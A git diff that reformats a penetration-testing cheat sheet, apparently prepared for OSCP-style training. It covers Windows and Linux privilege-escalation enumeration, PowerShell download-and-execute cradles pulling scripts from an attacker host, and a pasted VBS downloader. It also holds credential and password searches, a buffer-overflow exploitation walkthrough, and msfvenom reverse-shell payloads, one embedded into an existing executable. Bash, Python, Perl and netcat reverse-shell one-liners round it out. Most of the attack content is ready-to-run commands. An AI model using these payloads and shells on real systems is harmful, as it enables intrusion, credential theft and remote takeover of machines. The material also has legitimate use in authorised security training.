@@ -947,62 +896,60 @@ The Windows Privesc Check is a very powerful tool for finding common misconfigur
 
 - First we will need to clone the latest version to our environment:
 
-```bash
-root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check
-Cloning into 'windows-privesc-check'...
-remote: Enumerating objects: 1232, done.
-remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232
-Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done.
-Resolving deltas: 100% (897/897), done.
-```
+  ```bash
+  root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check
+  Cloning into 'windows-privesc-check'...
+  remote: Enumerating objects: 1232, done.
+  remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232
+  Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done.
+  Resolving deltas: 100% (897/897), done.
+  ```
 
 - Next we will need to setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:
 
-```bash
-root@kali:~/tools# cd windows-privesc-check/
-root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80
-Serving HTTP on 0.0.0.0 port 80 ...
-```
+  ```bash
+  root@kali:~/tools# cd windows-privesc-check/
+  root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80
+  Serving HTTP on 0.0.0.0 port 80 ...
+  ```
 
 - Now we will need to transfer the file to our remote windows box:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");`
 
-`@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/windows-privesc-check2.exe\", \"C:\\Users\\Public\\Downloads\\windows-privesc-check2.exe\");`
+- And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
 
-And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+  ```CMD
+  C:\Users\Admin>cd ..
+  C:\Users>cd Public
+  C:\Users\Public>cd Downloads
+  C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
+  windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
+  ```
 
-```CMD
-C:\Users\Admin>cd ..
-C:\Users>cd Public
-C:\Users\Public>cd Downloads
-C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
-windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
-```
-
-The windows-privesc-check will create a detailed HTML report and text based report for your review.
+- The windows-privesc-check will create a detailed HTML report and text based report for your review.
 
 ##### Running Sherlock
 
 Sherlock is a powershell library with a number of privledge escalation checkers built in. We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.
 
-```bash
-root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
-Cloning into 'Sherlock'...
-remote: Enumerating objects: 3, done.
-remote: Counting objects: 100% (3/3), done.
-remote: Compressing objects: 100% (3/3), done.
-remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
-Unpacking objects: 100% (75/75), done.
-root@kali:~test# cd Sherlock/
-root@kali:~test/Sherlock# ls
-LICENSE  README.md  Sherlock.ps1
-root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
-root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
-Serving HTTP on 0.0.0.0 port 80 ...
-```
+  ```bash
+  root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
+  Cloning into 'Sherlock'...
+  remote: Enumerating objects: 3, done.
+  remote: Counting objects: 100% (3/3), done.
+  remote: Compressing objects: 100% (3/3), done.
+  remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
+  Unpacking objects: 100% (75/75), done.
+  root@kali:~test# cd Sherlock/
+  root@kali:~test/Sherlock# ls
+  LICENSE  README.md  Sherlock.ps1
+  root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
+  root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
+  Serving HTTP on 0.0.0.0 port 80 ...
+  ```
 
-Now we can run this from the remote Windows CMD shell:
+- Now we can run this from the remote Windows CMD shell:
   `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"`
-
 - Or from a Windows Powershell:
   `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')`
 
@@ -1010,39 +957,37 @@ Now we can run this from the remote Windows CMD shell:
 
 Sherlock has been superceded by a .net Windows enumeration platform called Watson which is frequently updated by the author. It is a bit tricker to deploy and use as you need to compile it yourself and match the version of .net with the target system's version.
 
-First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around:
+- First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around:
 
-```CMD
-cd \Windows\Microsoft.NET\Framework\
-dir /s msbuild
-```
+  ```CMD
+  cd \Windows\Microsoft.NET\Framework\
+  dir /s msbuild
+  ```
 
-Only active versions of .NET will have the msbuild.exe. Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine. Download the latest version of Watson from github:
+- Only active versions of .NET will have the msbuild.exe. Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine. Download the latest version of Watson from github:
 
   `git clone https://github.com/rasta-mouse/Watson.git`
+- And open it using Visual Studio. In the Solution Explorer, click the Properties and modify the "Target Framework:" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B).
 
-And open it using Visual Studio. In the Solution Explorer, click the Properties and modify the "Target Framework:" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B).
+- Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:
 
-Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:
+  ```bash
+  root@kali:~/tools# cd Watson/
+  root@kali:~/tools/Watson# python -m SimpleHTTPServer 80
+  Serving HTTP on 0.0.0.0 port 80 ...
+  ```
 
-```bash
-root@kali:~/tools# cd Watson/
-root@kali:~/tools/Watson# python -m SimpleHTTPServer 80
-Serving HTTP on 0.0.0.0 port 80 ...
-```
-
-Now we will need to transfer the compiled Watson.exe file to our remote windows box:
-
+- Now we will need to transfer the compiled Watson.exe file to our remote windows box:
   `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/Watson.exe\", \"C:\\Users\\Public\\Downloads\\Watson.exe\");`
 
 And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
 
-```CMD
-C:\Users\Admin>cd ..
-C:\Users>cd Public
-C:\Users\Public>cd Downloads
-C:\Users\Public\Downloads>Watson.exe
-```
+  ```CMD
+  C:\Users\Admin>cd ..
+  C:\Users>cd Public
+  C:\Users\Public>cd Downloads
+  C:\Users\Public\Downloads>Watson.exe
+  ```
 
 ##### Running JAWS - Just Another Windows (Enum) Script
 
@@ -1057,136 +1002,137 @@ JAWS is another powershell library that was built with privledge escalation of t
 And we should see the following output start to appear:
 ```CMD
 Running J.A.W.S. Enumeration
-        - Gathering User Information
-        - Gathering Processes, Services and Scheduled Tasks
-        - Gathering Installed Software
+  - Gathering User Information
+  - Gathering Processes, Services and Scheduled Tasks
+  - Gathering Installed Software
 ```
 
 ##### CopyAndPasteEnum.bat
 
 No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial). Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:
 
-      ```bat
-      echo Windows Privilege Escalation Report - Copy and Paste Version (No file upload required) - Copy and Paste this script into your reverse shell console to create a simple report file.
-      @echo --------- BASIC WINDOWS RECON ---------  > report.txt
-      timeout 1
-      net config Workstation  >> report.txt
-      timeout 1
-      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
-      timeout 1
-      hostname >> report.txt
-      timeout 1
-      net users >> report.txt
-      timeout 1
-      ipconfig /all >> report.txt
-      timeout 1
-      route print >> report.txt
-      timeout 1
-      arp -A >> report.txt
-      timeout 1
-      netstat -ano >> report.txt
-      timeout 1
-      netsh firewall show state >> report.txt	
-      timeout 1
-      netsh firewall show config >> report.txt
-      timeout 1
-      schtasks /query /fo LIST /v >> report.txt
-      timeout 1
-      tasklist /SVC >> report.txt
-      timeout 1
-      net start >> report.txt
-      timeout 1
-      DRIVERQUERY >> report.txt
-      timeout 1
-      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
-      timeout 1
-      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
-      timeout 1
-      dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
-      timeout 1
-      findstr /si password *.xml *.ini *.txt >> report.txt
-      timeout 1
-      reg query HKLM /f password /t REG_SZ /s >> report.txt
-      timeout 1
-      reg query HKCU /f password /t REG_SZ /s >> report.txt 
-      timeout 1
-      dir "C:\"
-      timeout 1
-      dir "C:\Program Files\" >> report.txt
-      timeout 1
-      dir "C:\Program Files (x86)\"
-      timeout 1
-      dir "C:\Users\"
-      timeout 1
-      dir "C:\Users\Public\"
-      timeout 1
-      echo REPORT COMPLETE!
-      ```
+  ```bat
+  echo Windows Privilege Escalation Report - Copy and Paste Version (No file upload required) - Copy and Paste this script into your reverse shell console to create a simple report file.
+  @echo --------- BASIC WINDOWS RECON ---------  > report.txt
+  timeout 1
+  net config Workstation  >> report.txt
+  timeout 1
+  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
+  timeout 1
+  hostname >> report.txt
+  timeout 1
+  net users >> report.txt
+  timeout 1
+  ipconfig /all >> report.txt
+  timeout 1
+  route print >> report.txt
+  timeout 1
+  arp -A >> report.txt
+  timeout 1
+  netstat -ano >> report.txt
+  timeout 1
+  netsh firewall show state >> report.txt	
+  timeout 1
+  netsh firewall show config >> report.txt
+  timeout 1
+  schtasks /query /fo LIST /v >> report.txt
+  timeout 1
+  tasklist /SVC >> report.txt
+  timeout 1
+  net start >> report.txt
+  timeout 1
+  DRIVERQUERY >> report.txt
+  timeout 1
+  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+  timeout 1
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+  timeout 1
+  dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
+  timeout 1
+  findstr /si password *.xml *.ini *.txt >> report.txt
+  timeout 1
+  reg query HKLM /f password /t REG_SZ /s >> report.txt
+  timeout 1
+  reg query HKCU /f password /t REG_SZ /s >> report.txt 
+  timeout 1
+  dir "C:\"
+  timeout 1
+  dir "C:\Program Files\" >> report.txt
+  timeout 1
+  dir "C:\Program Files (x86)\"
+  timeout 1
+  dir "C:\Users\"
+  timeout 1
+  dir "C:\Users\Public\"
+  timeout 1
+  echo REPORT COMPLETE!
+  ```
 
 ##### CopyAndPasteFileDownloader.bat
 
 Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)
 
-      ```bat
-      echo Set args = Wscript.Arguments  > webdl.vbs
-      timeout 1
-      echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
-      timeout 1
-      echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
-      timeout 1
-      echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
-      timeout 1
-      echo xHttp.Open "GET", Url, False  >> webdl.vbs
-      timeout 1
-      echo xHttp.Send  >> webdl.vbs
-      timeout 1
-      echo with bStrm      >> webdl.vbs
-      timeout 1
-      echo 	.type = 1 '      >> webdl.vbs
-      timeout 1
-      echo 	.open      >> webdl.vbs
-      timeout 1
-      echo 	.write xHttp.responseBody      >> webdl.vbs
-      timeout 1
-      echo 	.savetofile "C:\users\public\windows-privesc-check2.exe", 2 '  >> webdl.vbs
-      timeout 1
-      echo end with >> webdl.vbs
-      timeout 1
-      echo
-      ```
-The file can be run using the following syntax:
-      `C:\temp\cscript.exe webdl.vbs`
+  ```bat
+  echo Set args = Wscript.Arguments  > webdl.vbs
+  timeout 1
+  echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
+  timeout 1
+  echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
+  timeout 1
+  echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
+  timeout 1
+  echo xHttp.Open "GET", Url, False  >> webdl.vbs
+  timeout 1
+  echo xHttp.Send  >> webdl.vbs
+  timeout 1
+  echo with bStrm      >> webdl.vbs
+  timeout 1
+  echo 	.type = 1 '      >> webdl.vbs
+  timeout 1
+  echo 	.open      >> webdl.vbs
+  timeout 1
+  echo 	.write xHttp.responseBody      >> webdl.vbs
+  timeout 1
+  echo 	.savetofile "C:\users\public\windows-privesc-check2.exe", 2 '  >> webdl.vbs
+  timeout 1
+  echo end with >> webdl.vbs
+  timeout 1
+  echo
+  ```
+
+The file can be run using the following syntax: `C:\temp\cscript.exe webdl.vbs`
 
 ##### windows_recon.bat
 
 An uploadable batch file for performing basic windows enumeration.
 
-      ```bat
-      echo --------- net config Workstation ---------  > report.txt
-      net config Workstation  >> report.txt
-      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
-      hostname >> report.txt
-      net users >> report.txt
-      ipconfig /all >> report.txt
-      route print >> report.txt
-      arp -A >> report.txt
-      netstat -ano >> report.txt
-      netsh firewall show state >> report.txt	
-      netsh firewall show config >> report.txt
-      schtasks /query /fo LIST /v >> report.txt
-      tasklist /SVC >> report.txt
-      net start >> report.txt
-      DRIVERQUERY >> report.txt
-      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
-      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
-      dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
-      findstr /si password *.xml *.ini *.txt >> report.txt
-      reg query HKLM /f password /t REG_SZ /s >> report.txt
-      reg query HKCU /f password /t REG_SZ /s >> report.txt
+  ```bat
+  echo --------- net config Workstation ---------  > report.txt
+  net config Workstation  >> report.txt
+  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
+  hostname >> report.txt
+  net users >> report.txt
+  ipconfig /all >> report.txt
+  route print >> report.txt
+  arp -A >> report.txt
+  netstat -ano >> report.txt
+  netsh firewall show state >> report.txt	
+  netsh firewall show config >> report.txt
+  schtasks /query /fo LIST /v >> report.txt
+  tasklist /SVC >> report.txt
+  net start >> report.txt
+  DRIVERQUERY >> report.txt
+  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
+  dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
+  findstr /si password *.xml *.ini *.txt >> report.txt
+  reg query HKLM /f password /t REG_SZ /s >> report.txt
+  reg query HKCU /f password /t REG_SZ /s >> report.txt
 
-      sc qc Spooler >> report.txt
-      accesschk.exe -ucqv Spooler >> report.txt
-      ```
+  sc qc Spooler >> report.txt
+  accesschk.exe -ucqv Spooler >> report.txt
+  ```
+
 - References:
   - [https://medium.com/@hakluke](mailto:https://medium.com/@hakluke)
   - <https://daya.blog/2018/01/06/windows-privilege-escalation/>
@@ -1201,78 +1147,61 @@ An uploadable batch file for performing basic windows enumeration.
   - <https://github.com/rasta-mouse/Watson>
   - <http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html>
   - <https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb>
+
 ## File Enumeration
 
 - Find UID 0 files root execution
-
-- `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`
-
+  - `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`
 - Get handy linux file system enumeration script (/var/tmp)  
-      `wget https://highon.coffee/downloads/linux-local-enum.sh`
-      `chmod +x ./linux-local-enum.sh`
-      `./linux-local-enum.sh`
-
+  - `wget https://highon.coffee/downloads/linux-local-enum.sh`
+  - `chmod +x ./linux-local-enum.sh`
+  - `./linux-local-enum.sh`
 - Find executable files updated in August  
-      `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`
-
+  - `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`
 - Find a specific file on linux  
-      `find /. -name suid\*`
-
+  - `find /. -name suid\*`
 - Find all the strings in a file  
-      `strings <filename>`
-
+  - `strings <filename>`
 - Determine the type of a file  
-      `file <filename>`
-
+  - `file <filename>`
 - Find all files with "password" in directory
-      `grep -Ri password . | grep -v Lang`
+  - `grep -Ri password . | grep -v Lang`
 
 ## HTTP Enumeration ( Always search for .txt,php,asp,aspx files )
 
 - Search for folders with gobuster:  
-      `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip -t 80 -x php,txt,asp,aspx`
-
+  - `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip -t 80 -x php,txt,asp,aspx`
 - OWasp DirBuster - Http folder enumeration - can take a dictionary file
-
 - Dirb - Directory brute force finding using a dictionary file  ( Very Slow )
-      `dirb http://$ip/ wordlist.dict`
-      `dirb <http://vm/>`
-
-      Dirb against a proxy
-
-- `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`
-
+  - `dirb http://$ip/ wordlist.dict`
+  - `dirb <http://vm/>`
+- Dirb against a proxy
+  - `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`
 - Nikto  
-      `nikto -h $ip`
-
+  - `nikto -h $ip`
 - HTTP Enumeration with NMAP  
-      `nmap --script=http-enum -p80 -n $ip/24`
-
+  - `nmap --script=http-enum -p80 -n $ip/24`
 - Nmap Check the server methods  
-      `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`
-
+  - `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`
 - Get Options available from web server
-       `curl -vX OPTIONS vm/test`
-
+  - `curl -vX OPTIONS vm/test`
 - Uniscan directory finder:  
-        `uniscan -qweds -u <http://vm/>`
-
+  - `uniscan -qweds -u <http://vm/>`
 - Wfuzz - The web brute forcer
 
-      ```shell
-      wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
-      wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
-      wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
-      wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
-      ```
+    ```shell
+    wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
+    wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
+    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
+    wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
+    ```
   - Recurse level 3
       `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`
 
 - We can also use a tool called dirhunt to search for interesting files
 
 - Open a service using a port knock (Secured with Knockd)  
-    `for x in 7000 8000 9000; do nmap -Pn --host_timeout 201
-    --max-retries 0 -p $x server_ip_address; done`
+  - `for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done`
 - WordPress Scan - Wordpress security scanner ( We can use the --enumerate function to enumerate users and bruteforce )
   - `wpscan --url $ip/blog --proxy $ip:3129`
 - RSH Enumeration - Unencrypted file transfer system
@@ -1287,26 +1216,16 @@ An uploadable batch file for performing basic windows enumeration.
 
 ## Buffer Overflow
 
-- DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
+  - DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
 
 ### Nmap Fuzzers
 
-- NMap Fuzzer List  
-      [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)
-
+- NMap Fuzzer List [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)
 - NMap HTTP Form Fuzzer  
-
-      ```shell
-      nmap --script http-form-fuzzer --script-args
-      'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
-      -p 80 $ip
-      ```
-
+  - `nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip`
 - Nmap DNS Fuzzer  
-    `nmap --script dns-fuzz --script-args timelimit=2h $ip -d`
-
+  - `nmap --script dns-fuzz --script-args timelimit=2h $ip -d`
 - Use the fuzzer learned in the course
-
 - MSFvenom  
   [*https://www.offensive-security.com/metasploit-unleashed/msfvenom/*](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
 
@@ -1314,151 +1233,116 @@ An uploadable batch file for performing basic windows enumeration.
 
 - Controlling EIP
 
-      ```shell
-      locate pattern_create
-      pattern_create.rb -l 2700
-      locate pattern_offset
-      pattern_offset.rb -q 39694438
-      ```
+    ```shell
+    locate pattern_create
+    pattern_create.rb -l 2700
+    locate pattern_offset
+    pattern_offset.rb -q 39694438
+    ```
 
 - Verify exact location of EIP - [\*] Exact match at offset 2606
-
-    `buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90`
-
+  - `buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90`
 - Check for “Bad Characters” - Run multiple times 0x00 - 0xFF
-
 - Use Mona to determine a module that is unprotected
-
 - Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP
-
 - Use NASM to determine the HEX code for a JMP ESP instruction
-
+    
+    ```
     /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
     JMP ESP  
     00000000 FFE4 jmp esp
+    ```
 
 - Run Mona in immunity log window to find (FFE4) XEF command
 
-      ```shell
-      !mona find -s "\xff\xe4" -m slmfc.dll  
-      found at 0x5f4a358f - Flip around for little endian format
-      buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
-      ```
-
+    ```shell
+    !mona find -s "\xff\xe4" -m slmfc.dll  
+    found at 0x5f4a358f - Flip around for little endian format
+    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
+    ```
     **We can use the view -> show executables modules and search for the instruction in the immunity debugger.**
 
 - MSFVenom to create payload
-
-    `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`
-
+  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`
 - Final Payload with NOP slide  
-
-    `buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode`
-
+  - `buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode`
 - Create a PE Reverse Shell
-
-    `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe`
-
+  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe`
 - Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai
-
-    `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe`
-
+  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe`
 - Create a PE reverse shell and embed it into an existing executable  
-
-    `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`
-
+  - `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`
 - Create a PE Reverse HTTPS shell
-
-    `msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe`
-
-- You can remove \x00\x0a\x0d\x20 almost in every app.
-
+  - `msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe`
+- You can remove `\x00\x0a\x0d\x20` almost in every app.
 - FTP - > \x00\x0d\x0a\x20\x40
 
 ## Shells
 
 - Netcat Shell Listener  
-
-    `nc -nlvp 4444`
+  - `nc -nlvp 4444`
 
 - Spawning a TTY Shell - Break out of Jail or limited shell
       You should almost always upgrade your shell after taking control of an apache or www user.
       (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
       (hint: sudo -l to see what you can run)
 
-- You may encounter limited shells that use rbash and only allow you to execute a single command per session.
-      You can overcome this by executing an SSH shell to your localhost:
-      ```shell
-      ssh user@$ip nc $localip 4444 -e /bin/sh
-      enter user's password
-      python -c 'import pty; pty.spawn("/bin/sh")'
-      export TERM=linux
-      ```
+- You may encounter limited shells that use rbash and only allow you to execute a single command per session. You can overcome this by executing an SSH shell to your localhost:
 
-      `python -c 'import pty; pty.spawn("/bin/sh")'`
+  ```shell
+  ssh user@$ip nc $localip 4444 -e /bin/sh
+  enter user's password
+  python -c 'import pty; pty.spawn("/bin/sh")'
+  export TERM=linux
+  ```
 
-      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`
-
-      `echo os.system('/bin/bash')`
-
-      `/bin/sh -i`
-
-      `perl —e 'exec "/bin/sh";'`
-
-      perl: `exec "/bin/sh";`
-
-      ruby: `exec "/bin/sh"`
-
-      lua: `os.execute('/bin/sh')`
-
-      From within IRB: `exec "/bin/sh"`
-
-      From within vi: `:!bash`
-     or
-
-      `:set shell=/bin/bash:shell`
-
-      From within vim `':!bash':`
-
-      From within nmap: `!sh`
-
-      From within tcpdump
-
-         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root
-
-      From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`
+  - `python -c 'import pty; pty.spawn("/bin/sh")'`
+  - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`
+  - `echo os.system('/bin/bash')`
+  - `/bin/sh -i`
+  - `perl —e 'exec "/bin/sh";'`
+  - perl: `exec "/bin/sh";`
+  - ruby: `exec "/bin/sh"`
+  - lua: `os.execute('/bin/sh')`
+  - From within IRB: `exec "/bin/sh"`
+  - From within vi: `:!bash`
+      or
+  - `:set shell=/bin/bash:shell`
+  - From within vim `':!bash':`
+  - From within nmap: `!sh`
+  - From within tcpdump: `echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root`
+  - From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`
 
 - Pen test monkey PHP reverse shell  
   - Bash
     - Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
-          `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+      `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
   - PERL
     - Here’s a shorter, feature-free version of the perl-reverse-shell:
-            `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+      `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
     - There’s also an alternative PERL revere shell here.
   - Python
     - This was tested under Linux / Python 2.7:
